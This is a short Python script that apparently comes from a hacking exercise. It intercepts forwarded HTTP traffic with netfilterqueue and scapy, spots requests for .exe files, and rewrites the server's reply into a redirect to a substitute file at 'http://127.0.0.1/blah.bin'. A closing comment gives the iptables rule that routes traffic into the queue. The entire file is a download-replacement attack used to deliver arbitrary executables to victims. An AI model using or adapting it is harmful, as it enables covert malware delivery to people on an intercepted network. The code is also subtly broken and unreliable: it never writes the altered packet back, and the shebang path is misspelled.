#!/urs/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print "[+] exe Request"
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print scapy_packet.show()
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print "[+] Replacing file"
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://127.0.0.1/blah.bin"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].len
                del scapy_packet[scapy.TCP].chksum


    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

#iptables -I FORWARD -j NFQUEUE --queue-num 0
